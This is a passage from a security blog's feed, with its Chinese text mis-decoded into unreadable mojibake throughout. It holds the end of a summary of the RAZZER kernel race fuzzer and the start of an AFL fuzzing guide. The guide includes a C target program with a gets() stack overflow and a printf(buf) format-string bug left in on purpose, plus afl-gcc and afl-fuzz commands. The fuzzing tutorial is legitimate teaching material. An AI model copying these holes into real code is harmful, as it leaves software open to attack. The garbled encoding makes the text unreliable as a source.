[19]å»ºè®®ä½¿ç”¨ç²—ç•¥äº¤é”™å‡è®¾æ¥åˆ©ç”¨ç²—ç²’åº¦å®šæ—¶ä¿¡æ¯æ¥ç¡®å®šäº‹ä»¶çš„çº¿ç¨‹äº¤é”™ã€‚</p><p><strong>é™æ€åˆ†æ</strong> é™æ€åˆ†æå·²è¢«å¹¿æ³›ç”¨äºå‘ç°æœªçŸ¥çš„bugã€‚åœ¨æ­¤ç±»åˆ«ä¸­ï¼Œæˆ‘ä»¬å°†é‡ç‚¹è®¨è®ºä¸ç«äº‰bugæ£€æµ‹æˆ–ç‚¹å¯¹åˆ†æå®æ–½ç›¸å…³çš„é™æ€åˆ†æå·¥ä½œã€‚ Relay [20]æ˜¯ä¸€ä¸ªé™æ€çš„ç«äº‰æ£€æµ‹å™¨ï¼Œé€‚ç”¨äºå†…æ ¸ç­‰å¤§å‹ç¨‹åºã€‚ Relayé€šè¿‡æ‰§è¡ŒåŸºäºé”å®šçš„è‡ªä¸‹è€Œä¸Šåˆ†æç”ŸæˆRacePairscandï¼ŒåŒæ—¶æ€»ç»“æ¯ä¸ªå‡½æ•°çš„è¡Œä¸ºã€‚ RacerX [21]ä¹Ÿå¯ç”¨äºæŸ¥æ‰¾å¤§å‹å¤æ‚å¤šçº¿ç¨‹ç³»ç»Ÿçš„ç«äº‰æ¡ä»¶å’Œæ­»é”ã€‚ç”±äºå•ç‹¬ä½¿ç”¨é™æ€åˆ†ææŠ€æœ¯çš„å±€é™æ€§ï¼Œè¿™äº›åŸºæœ¬ä¸Šå¯¼è‡´é«˜çš„è¯¯æŠ¥ç‡ï¼ˆä¾‹å¦‚ï¼ŒRelayåœ¨Linuxå†…æ ¸ä¸Šæ˜¾ç¤ºå‡º84ï¼…çš„è¯¯æŠ¥ç‡ï¼‰ï¼Œä¸¥é‡é™åˆ¶äº†å®ƒä»¬åœ¨å®è·µä¸­çš„ä½¿ç”¨ã€‚ç„¶è€Œï¼ŒRAZZERè¿˜åˆ©ç”¨åŠ¨æ€åˆ†ææŠ€æœ¯ï¼Œè§£å†³äº†é«˜è¯¯æŠ¥ç‡çš„å¯èƒ½æ€§ã€‚åœ¨ç‚¹å¯¹åˆ†æå®æ–½æ–¹é¢ï¼Œæœ€è¿‘æå‡ºäº†K-miner [22]ï¼Œé€šè¿‡ç¨‹åºé—´å’Œä¸Šä¸‹æ–‡æ•æ„Ÿæ€§åˆ†ææ­ç¤ºå•†å“æ“ä½œç³»ç»Ÿä¸­çš„å†…å­˜æŸåæ¼æ´ã€‚ RAZZERçš„é™æ€åˆ†ææ˜¯åŸºäºK-minerçš„å®ç°è€Œæ„å»ºçš„ï¼Œä½†ç»è¿‡ä¿®æ”¹ä»¥é€šè¿‡ç‚¹åˆ†ææ¥è¯†åˆ«RacePairscandã€‚</p><h2 id="VI-è®¨è®º"><a href="#VI-è®¨è®º" class="headerlink" title="VI.è®¨è®º"></a>VI.è®¨è®º</h2><p><strong>é™æ€åˆ†æä¸­çš„æ¼æŠ¥</strong>  ç”±äºRAZZERä¾èµ–äºé™æ€åˆ†æçš„ç»“æœï¼Œå¦‚æœRacePaircandä¸­ç¼ºå°‘ä»»ä½•çœŸæ­£çš„ç«äº‰å¯¹ï¼Œåˆ™ä¼šå¯¼è‡´RAZZERå¯¹bugçš„æ¼æŠ¥ã€‚ é™æ€åˆ†æçš„è¿™ç§ä¸¢å¤±æƒ…å†µå¯èƒ½ä¸»è¦æ˜¯å› ä¸ºåˆ†åŒºåˆ†æå‘ç”Ÿçš„ã€‚ å› ä¸ºRAZZERçš„åˆ†åŒºåˆ†æåŸºäºè·¨è¶Šä¸åŒå†…æ ¸æ¨¡å—çš„ç«äº‰å¾ˆå°‘å‘ç”Ÿï¼ˆä¾‹å¦‚ï¼Œæ–‡ä»¶ç³»ç»Ÿå’Œç»ˆç«¯è®¾å¤‡é©±åŠ¨ç¨‹åºï¼‰è¿™ä¸ªå‡è®¾ã€‚ å› æ­¤ï¼Œå¦‚æœå‡è®¾çš„æƒ…å†µå‘ç”Ÿäº†ï¼ŒRAZZERçš„RacePaircandå°†ä¸ä¼šåŒ…å«è¿™æ ·çš„ç«äº‰å¯¹ï¼Œä»è€Œå¯¼è‡´æ¼æŠ¥ã€‚è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥å»é™¤RAZZERçš„åˆ†åŒºåˆ†æï¼Œé‡‡ç”¨æ›´ç²¾ç¡®çš„é™æ€åˆ†ææŠ€æœ¯ã€‚</p><p><strong>å°†RAZZERåº”ç”¨äºå…¶ä»–ç³»ç»Ÿ</strong>  RAZZERæ˜¯ä¸€ç§ç°ç›’æ¨¡ç³Šæµ‹è¯•ï¼Œæ‰€ä»¥åªè¦æºä»£ç å’Œå¯¹åº”çš„è™šæ‹Ÿç¯å¢ƒçš„æ”¯æŒï¼Œå°†RAZZERåº”ç”¨äºå…¶ä»–ç°ä»£æ“ä½œç³»ç»Ÿï¼ˆå¦‚Windowsï¼ŒMacOSXï¼ŒFreeBSDï¼Œä»¥åŠä¸€äº›å¼€æºå†…æ ¸ï¼‰æ˜¯å¾ˆå®¹æ˜“çš„ã€‚ ä»ä»‹ç»ä»¥åŠå¼€æºçš„ä»£ç ä¸Šæ¥çœ‹RAZZERåªæ˜¯åœ¨å¤„ç†ç³»ç»Ÿè°ƒç”¨è°ƒç”¨æ¨¡å‹çš„æ—¶å€™æ˜¯é’ˆå¯¹Linuxçš„ï¼Œå…¶ä½™æ‰€æœ‰è®¾è®¡éƒ½æ˜¯å¹³å°æ— å…³çš„ï¼Œå› ä¸ºå…¶æ ¸å¿ƒæœºåˆ¶å¯ä»¥ç¦»çº¿ï¼ˆå³é™æ€åˆ†æï¼‰æˆ–é€æ˜ï¼ˆå³å®šåˆ¶æ‰§è¡Œç³»ç»Ÿç®¡ç†ç¨‹åºï¼‰ã€‚</p><p><strong>å˜å¼‚ç­–ç•¥</strong>  å¦‚æœå°†RAZZERæµ‹è¯•å†…æ ¸ç«äº‰æ¼æ´çš„æ€æƒ³åº”ç”¨äºç”¨æˆ·ç¨‹åºï¼Œå¯èƒ½ä¸éœ€è¦åœ¨è¯†åˆ«ç«äº‰åå†ä½¿ç”¨å…¶ä»–å˜å¼‚ç­–ç•¥ã€‚ å› ä¸ºä¸å¶å°”å…è®¸ä½¿ç”¨ç«äº‰æé«˜æ€§èƒ½çš„Linuxå†…æ ¸ä¸åŒï¼Œå¤§å¤šæ•°ç”¨æˆ·ç¨‹åºä¸­éƒ½ä¼šå­˜åœ¨æ•°æ®ç«äº‰è¿™æ ·çš„bugã€‚</p><h2 id="VII-ç»“è®º"><a href="#VII-ç»“è®º" class="headerlink" title="VII.ç»“è®º"></a>VII.ç»“è®º</h2><p>æœ¬æ–‡åŸºäºRAZZERè¿™ç§ç»“åˆé™æ€åˆ†æå’ŒåŠ¨æ€æ¨¡ç³Šæµ‹è¯•çš„æ–¹æ¡ˆï¼Œæ¥å¯¹å†…æ ¸ç«äº‰æ¼æ´çš„æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯åšäº†ä»‹ç»ã€‚RAZZERæ˜¯ä¸€æ¬¾ä¸ºç«äº‰æ¼æ´é‡èº«å®šåˆ¶çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œä¸ä»…å…¶å®ç°æ–¹æ¡ˆæå…·ä»£è¡¨æ€§ï¼Œå…¶å®çš„å®é™…æ•ˆæœä¹Ÿéå¸¸çš„å¥½ã€‚ å®ƒåˆ©ç”¨é™æ€åˆ†ææ¥å‘ç°æ½œåœ¨çš„æ•°æ®ç«äº‰ç‚¹ï¼Œä»¥æŒ‡å¯¼æ¨¡ç³Šå™¨è¯†åˆ«ç«äº‰ã€‚ æ­¤å¤–ï¼Œå®ƒä¿®æ”¹åº•å±‚ç®¡ç†ç¨‹åºä»¥ç¡®å®šæ€§åœ°è§¦å‘ç«äº‰ã€‚ å¯¹RAZZERçš„è¯„ä¼°è¯æ˜äº†å…¶å¼ºå¤§çš„æ£€æµ‹ç«äº‰çš„èƒ½åŠ›ã€‚ å®ƒå·²ç»åœ¨Linuxå†…æ ¸ä¸­å‘ç°äº†30ä¸ªæ–°çš„ç«äº‰ï¼Œå¹¶ä¸”ä¸å…¶ä»–æœ€å…ˆè¿›çš„å·¥å…·ï¼ˆç‰¹åˆ«æ˜¯Syzkallerå’ŒSKIï¼‰è¿›è¡Œäº†æ¯”è¾ƒç ”ç©¶ï¼Œè¯æ˜äº†å®ƒåœ¨æ£€æµ‹å†…æ ¸ä¸­çš„ç«äº‰æ¼æ´æ–¹é¢çš„å‡ºè‰²è¡¨ç°ã€‚</p><h2 id="REFERENCES"><a href="#REFERENCES" class="headerlink" title="REFERENCES"></a>REFERENCES</h2><p>[1] MITRE. CVE-2016-8655., 2016. <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-8655" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-8655</a>.</p><p>[2] MITRE. CVE-2017-2636., 2017. <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-2636" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-2636</a>.</p><p>[3] MITRE. CVE-2017-17712., 2017. <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17712" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17712</a>.</p><p>[4] Fonseca P , Rodrigues R , BjÃ¶rn B. Brandenburg. SKI: exposing kernel concurrency bugs through systematic schedule exploration[C]// Usenix Conference on Operating Systems Design &amp; Implementation. USENIX Association, 2014.</p><p>[5] Burckhardt S , Kothari P , Musuvathi M , et al. A randomized scheduler with probabilistic guarantees of finding bugs[J]. ACM SIGARCH Computer Architecture News, 2010, 38(1):167.</p><p>[6] I. Molnar. Runtime locking correctness validator, 2018. <a href="https://www.kernel.org/doc/Documentation/locking/lockdep-design.txt" target="_blank" rel="noopener">https://www.kernel.org/doc/Documentation/locking/lockdep-design.txt</a>.</p><p>[7] Kernel address sanitizer, 2018. <a href="https://github.com/google/kasan/wiki" target="_blank" rel="noopener">https://github.com/google/kasan/wiki</a>.</p><p>[8] Sui Y , Xue J . [ACM Press the 25th International Conference - Barcelona, Spain (2016.03.17-2016.03.18)] Proceedings of the 25th International Conference on Compiler Construction - CC 2016 - SVF: interprocedural static value-flow analysis in LLVM[J]. 2016:265-266.</p><p>[9] D. Vyukov. Syzkaller, 2015. <a href="https://github.com/google/syzkaller" target="_blank" rel="noopener">https://github.com/google/syzkaller</a>.</p><p>[10] å²è®°, æ›¾æ˜­é¾™, æ¨ä»ä¿, et al. Fuzzing æµ‹è¯•æŠ€æœ¯ç»¼è¿°[J]. ä¿¡æ¯ç½‘ç»œå®‰å…¨, 2014(3):87-91.</p><p>[11] Pham V T , Roychoudhury A . Coverage-based Greybox Fuzzing as Markov Chain[C]// Acm Sigsac Conference on Computer &amp; Communications Security. ACM, 2016.</p><p>[12] You W , Zong P , Chen K , et al. SemFuzz: Semantics-based Automatic Generation of Proof-of-Concept Exploits[C]// Acm Sigsac Conference. ACM, 2017.</p><p>[13] Burckhardt S , Kothari P , Musuvathi M , et al. A randomized scheduler with probabilistic guarantees of finding bugs[J]. ACM SIGARCH Computer Architecture News, 2010, 38(1):167.</p><p>[14] Veeraraghavan K , Chen P M , Flinn J , et al. Detecting and Surviving Data Races using Complementary Schedules[C]// Proceedings of the 23rd ACM Symposium on Operating Systems Principles 2011, SOSP 2011, Cascais, Portugal, October 23-26, 2011. ACM, 2011.</p><p>[15] Serebryany K , Iskhodzhanov T . ThreadSanitizer: data race detection in practice[C]// Workshop on Binary Instrumentation &amp; Applications. ACM, 2009.</p><p>[16] Zhang T , Lee D , Jung C . TxRace: Efficient Data Race Detection Using Commodity Hardware Transactional Memory[J]. Acm Sigplan Notices, 2016, 50(2):159-173.</p><p>[17] Zhang T , Jung C , Lee D . ProRace: Practical Data Race Detection for Production Use[J]. Acm Sigarch Computer Architecture News, 2017, 45(1):149-162.</p><p>[18] Kasikci B , Zamfir C , Candea G . RaceMob: Crowdsourced data race detection[C]// Proceedings of the Twenty-Fourth ACM Symposium on Operating Systems Principles. ACM, 2013.</p><p>[19] Kasikci B , Cui W , Ge X , et al. [ACM Press the 26th Symposium - Shanghai, China (2017.10.28-2017.10.28)] Proceedings of the 26th Symposium on Operating Systems Principles, - SOSP \â€17 - Lazy Diagnosis of In-Production Concurrency Bugs[J]. 2017:582-598.</p><p>[20] Voung J W , Jhala R , Lerner S . RELAY: static race detection on millions of lines of code[C]// Proceedings of the 6th joint meeting of the European Software Engineering Conference and the ACM SIGSOFT International Symposium on Foundations of Software Engineering, 2007, Dubrovnik, Croatia, September 3-7, 2007. ACM, 2007.</p><p>[21] Engler D . RacerX : Effective, static detection of race conditions and deadlocks[C]// Proc. ACM Symposium Operating Systems Principles, 2003. ACM, 2003.</p><p>[22] D. Gens, S. Schmitt, L. Davi, and A.-R. Sadeghi. K-miner: Uncovering memory corruption in linux. In Proceedings of the 2018 Annual Network and Distributed System Security Symposium (NDSS), San Diego, CA, Feb. 2018.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;å‡ºå¤„ï¼šS&amp;amp;P 2019 &lt;/p&gt;
&lt;p&gt;ä½œè€…ï¼šDae R. Jeong, Kyungtae Kim, Basavesh Shivakumar, Byoungyoung Lee, Insik Shin &lt;/p&gt;
&lt;p&gt;å•ä½ï¼šComputer Science, KAIS
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>AFLä½¿ç”¨æŒ‡å—</title>
    <link href="http://zer0yu.github.io/2019/05/15/how-to-use-afl-fuzz/"/>
    <id>http://zer0yu.github.io/2019/05/15/how-to-use-afl-fuzz/</id>
    <published>2019-05-15T13:41:00.000Z</published>
    <updated>2019-05-15T15:28:07.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>äºŒè¿›åˆ¶åˆ†ææ–¹é¢ä¸»è¦åˆ©ç”¨æŠ€æœ¯åŒ…æ‹¬ï¼šåŠ¨æ€åˆ†æ(Dynamic Analysis)ã€é™æ€åˆ†æ(Static Analysis)ã€ç¬¦å·åŒ–æ‰§è¡Œ(Symbolic Execution)ã€Constraint Solvingã€èµ„è®¯æµè¿½è¸ªæŠ€æœ¯(Data Flow Tracking)ä»¥åŠè‡ªåŠ¨åŒ–æµ‹è¯•(Fuzz Testing)</p><p>AFLåŸç†ä»‹ç»å‚è€ƒï¼š<br><a href="https://www.freebuf.com/articles/system/191536.html" target="_blank" rel="noopener">ã€ŠAFLæ¼æ´æŒ–æ˜æŠ€æœ¯æ¼«è°ˆï¼ˆä¸€ï¼‰ï¼šç”¨AFLå¼€å§‹ä½ çš„ç¬¬ä¸€æ¬¡Fuzzingã€‹</a></p><p>æœ¬æŒ‡å—ä½¿ç”¨çš„ç¯å¢ƒæ˜¯ kali linux 2019.1</p><h2 id="0x01-AFLçš„åŸºæœ¬ä½¿ç”¨"><a href="#0x01-AFLçš„åŸºæœ¬ä½¿ç”¨" class="headerlink" title="0x01 AFLçš„åŸºæœ¬ä½¿ç”¨"></a>0x01 AFLçš„åŸºæœ¬ä½¿ç”¨</h2><h3 id="1-ä½¿ç”¨afl-gcc"><a href="#1-ä½¿ç”¨afl-gcc" class="headerlink" title="1. ä½¿ç”¨afl-gcc"></a>1. ä½¿ç”¨afl-gcc</h3><h4 id="1-1-ä½¿ç”¨AFLæ’æ¡©ç¨‹åº"><a href="#1-1-ä½¿ç”¨AFLæ’æ¡©ç¨‹åº" class="headerlink" title="1.1 ä½¿ç”¨AFLæ’æ¡©ç¨‹åº"></a>1.1 ä½¿ç”¨AFLæ’æ¡©ç¨‹åº</h4><p>ç›®æ ‡ç¨‹åº</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">'A'</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//å¦‚æœè¾“å…¥çš„å­—ç¬¦ä¸²çš„é¦–å­—ç¬¦ä¸ºAå¹¶ä¸”é•¿åº¦ä¸º66ï¼Œåˆ™å¼‚å¸¸é€€å‡º</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">'F'</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//å¦‚æœè¾“å…¥çš„å­—ç¬¦ä¸²çš„é¦–å­—ç¬¦ä¸ºFå¹¶ä¸”é•¿åº¦ä¸º6ï¼Œåˆ™å¼‚å¸¸é€€å‡º</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"it is good!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);<span class="comment">//å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);<span class="comment">//å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</span></span><br><span class="line">    vuln(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨afl-gccè¿›è¡Œæ’æ¡©ç¼–è¯‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-gcc -g -o ./zerotest/vuln ./zerotest/vuln.c</span><br></pre></td></tr></table></figure><p>PS:<br>å¦‚æœç›®æ ‡ç¨‹åºä¸­æœ‰Makefileï¼Œé‚£ä¹ˆåˆ†ä¸¤ç§æƒ…å†µ:</p><ol><li>ç¨‹åºæ˜¯ç”¨autoconfæ„å»ºï¼Œé‚£ä¹ˆæ­¤æ—¶åªéœ€è¦æ‰§è¡Œå¦‚ä¸‹å³å¯</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure CC=&quot;afl-gcc&quot; CXX=&quot;afl-g++&quot;</span><br></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œè¿˜å¯ä»¥æ‰§è¡Œå¦‚ä¸‹è¯­å¥è®¾ç½®LD_LIBRARY_PATHè®©ç¨‹åºåŠ è½½ç»è¿‡AFLæ’æ¡©çš„.soæ–‡ä»¶ï¼Œè¿›è¡Œé™æ€æ„å»ºè€Œä¸æ˜¯åŠ¨æ€é“¾æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --disable-shared CC=&quot;afl-gcc&quot; CXX=&quot;afl-g++&quot;</span><br></pre></td></tr></table></figure><ol start="2"><li>ç¨‹åºä¸æ˜¯ç”¨autoconfæ„å»ºï¼Œé‚£ä¹ˆç›´æ¥ä¿®æ”¹Makefileæ–‡ä»¶ä¸­çš„ç¼–è¯‘å™¨ä¸º<code>afl-gcc/g++</code>ã€‚</li></ol><p>ä¸ºäº†åæœŸæ›´å¥½çš„åˆ†æcrashï¼Œåœ¨æ­¤å¤„å¯ä»¥å¼€å¯Address Sanitizer(ASAN)è¿™ä¸ªå†…å­˜æ£€æµ‹å·¥å…·ï¼Œæ­¤å·¥å…·å¯ä»¥æ›´å¥½çš„æ£€æµ‹å‡ºç¼“å­˜åŒºæº¢å‡ºã€UAF ç­‰å†…å­˜æ¼æ´ï¼Œå¼€å¯æ–¹æ³•å¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AFL_USE_ASAN=1 ./configure CC=afl-gcc CXX=afl-g++ LD=afl-gcc--disable-shared</span><br><span class="line">AFL_USE_ASAN=1 make</span><br></pre></td></tr></table></figure><p>ä¸ä½¿ç”¨ AFL ç¼–è¯‘æ’æ¡©æ—¶ï¼Œå¯ä½¿ç”¨ä»¥ä¸‹æ–¹å¼å¼€å¯ Address Sanitizerã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure CC=gcc CXX=g++ CFLAGS=&quot;-g -fsanitize=address&quot;</span><br><span class="line">make</span><br></pre></td></tr></table></figure><h4 id="1-2-å¼€å§‹fuzz"><a href="#1-2-å¼€å§‹fuzz" class="headerlink" title="1.2 å¼€å§‹fuzz"></a>1.2 å¼€å§‹fuzz</h4><p>fuzzçš„è¯­æ³•ä¸€èˆ¬æƒ…å†µæ˜¯ä¸¤ç§:</p><ol><li>ç›´æ¥ä»stdinè¯»å–è¾“å…¥çš„ç›®æ ‡ç¨‹åº</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program [â€¦paramsâ€¦]</span><br></pre></td></tr></table></figure><ol start="2"><li>ä»æ–‡ä»¶è¯»å–è¾“å…¥çš„ç›®æ ‡ç¨‹åºï¼Œ@@å°±æ˜¯å ä½ç¬¦ï¼Œè¡¨ç¤ºè¾“å…¥æ›¿æ¢çš„ä½ç½®</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure><p>æ­¤å¤„æˆ‘é‡‡ç”¨ç¬¬ä¸€ç§æ–¹å¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m 300 -i ./zerotest/fuzz_in -o ./zerotest/fuzz_out ./zerotest/vuln -f</span><br></pre></td></tr></table></figure><p>PS: å¸¸è§å‚æ•°çš„å«ä¹‰å¦‚ä¸‹</p><ul><li>-få‚æ•°è¡¨ç¤ºï¼štestcaseçš„å†…å®¹ä¼šä½œä¸ºafl_testçš„stdin</li><li>-må‚æ•°è¡¨ç¤ºåˆ†é…çš„å†…å­˜ç©ºé—´</li><li>-i æŒ‡å®šæµ‹è¯•æ ·æœ¬çš„è·¯å¾„</li><li>-o æŒ‡å®šè¾“å‡ºç»“æœçš„è·¯å¾„</li><li>/dev/null ä½¿é”™è¯¯ä¿¡æ¯ä¸è¾“å‡ºåˆ°å±å¹•</li><li>-tï¼šè®¾ç½®ç¨‹åºè¿è¡Œè¶…æ—¶å€¼ï¼Œå•ä½ä¸º ms</li><li>-Mï¼šè¿è¡Œä¸»(Master) Fuzzer</li><li>-Sï¼šè¿è¡Œä»å±(Slave) Fuzzer</li></ul><h4 id="1-3-fuzzçš„ç»“æœ"><a href="#1-3-fuzzçš„ç»“æœ" class="headerlink" title="1.3 fuzzçš„ç»“æœ"></a>1.3 fuzzçš„ç»“æœ</h4><p><img src="https://i.loli.net/2019/05/15/5cdc17c37edfd11335.png" alt="60889809-4D22-4C14-AF3C-E98D2C5EB60D.png"></p><p>ä»ç•Œé¢ä¸Šä¸»è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹:</p><ol><li>last new path å¦‚æœæŠ¥é”™é‚£ä¹ˆè¦åŠæ—¶ä¿®æ­£å‘½ä»¤è¡Œå‚æ•°ï¼Œä¸ç„¶ç»§ç»­fuzzä¹Ÿæ˜¯å¾’åŠ³ï¼ˆå› ä¸ºè·¯å¾„æ˜¯ä¸ä¼šæ”¹å˜çš„ï¼‰ï¼›</li><li>cycles done å¦‚æœå˜ç»¿å°±è¯´æ˜åé¢åŠæ—¶ç»§ç»­fuzzï¼Œå‡ºç°crashçš„å‡ ç‡ä¹Ÿå¾ˆä½äº†ï¼Œå¯ä»¥é€‰æ‹©åœ¨è¿™ä¸ªæ—¶å€™åœæ­¢</li><li>uniq crashes ä»£è¡¨çš„æ˜¯crashçš„æ•°é‡</li></ol><h4 id="1-4-crashåˆ†æ"><a href="#1-4-crashåˆ†æ" class="headerlink" title="1.4 crashåˆ†æ"></a>1.4 crashåˆ†æ</h4><p>PS: xxdå‘½ä»¤çš„ä½œç”¨å°±æ˜¯å°†ä¸€ä¸ªæ–‡ä»¶ä»¥åå…­è¿›åˆ¶çš„å½¢å¼æ˜¾ç¤ºå‡ºæ¥</p><p><img src="https://i.loli.net/2019/05/15/5cdc17e6d731a12930.png" alt="1FF9D91F-F823-4DF7-B716-C68B58134D65.png"></p><p>å¯ä»¥çœ‹åˆ°å·²ç»å¾—åˆ°çš„å‡ ä¸ªcrashæ–‡ä»¶ï¼Œé‚£ä¹ˆåˆ†æçš„è¯åªéœ€è¦å°†å…¶ä½œä¸ºä¹‹å‰vulnæ–‡ä»¶çš„è¾“å…¥ï¼Œä½¿ç”¨gdbè°ƒè¯•åˆ†æå°±å¯ä»¥å¾—åˆ°è¯¦ç»†ç»“æœäº†ï¼Œä½†æ˜¯åœ¨è¿™ä¹‹å‰å¯ä»¥ä½¿ç”¨xxdçœ‹ä¸€ä¸‹å…¶ä¸­æ•°æ®çš„å†…å®¹åšä¸€ä¸ªåˆæ­¥çš„åˆ¤æ–­ã€‚</p><p>åˆ†åˆ«çœ‹ä¸€ä¸‹è¿™å‡ ä¸ªcrashçš„ä¿¡æ¯</p><ol><li>å¯ä»¥çœ‹åˆ°åº”è¯¥æ˜¯æ»¡è¶³äº†å¼€å¤´æ˜¯Fä¸”å­—ç¬¦ä¸²é•¿åº¦ä¸º6çš„å¼‚å¸¸é€€å‡ºæƒ…å†µ<br><img src="https://i.loli.net/2019/05/15/5cdc1819e028a13399.png" alt="63005FA6-59BD-48BD-8B19-F5EF08C84D4E.png"></li><li>çœ‹è¿™ä¸ªæ•°æ®æƒ…å†µå¯èƒ½æ˜¯æ ˆæº¢å‡º<br><img src="https://i.loli.net/2019/05/15/5cdc18323104a44582.png" alt="D74734D1-F13E-4256-B47C-260817BE102E.png"></li><li>æ ˆæº¢å‡º<br><img src="https://i.loli.net/2019/05/15/5cdc1890b95d940410.png" alt="B909DBCF-66FF-4C37-BF39-1ED413A6B0C3.png"></li><li>ç¬¦åˆé¦–å­—ç¬¦ä¸ºAä¸”æ ˆæº¢å‡º<br><img src="https://i.loli.net/2019/05/15/5cdc18a6085c235233.png" alt="8213201E-7B35-45D7-9057-5493978CCABB.png"></li><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²?å¯èƒ½<br><img src="https://i.loli.net/2019/05/15/5cdc18bd9a06782571.png" alt="C7F22A69-F1E6-4863-B9BD-08D88A82C789.png"></li><li>ç¬¦åˆé¦–å­—ç¬¦ä¸ºAä¸”å­—ç¬¦ä¸²é•¿åº¦ä¸º66çš„å¼‚å¸¸é€€å‡ºæƒ…å†µ<br><img src="https://i.loli.net/2019/05/15/5cdc18d239e5642604.png" alt="41BAF060-7874-4D52-93CC-49FD86AF26D3.png"></li></ol><p>ä¸»è¦å‚è€ƒ:<br><a href="https://xz.aliyun.com/t/4314" target="_blank" rel="noopener">ã€Šåˆæ¢Fuzz-AFLã€‹</a></p><h4 id="1-5-è¯­æ–™åº“è’¸é¦-Corpus-Distillation"><a 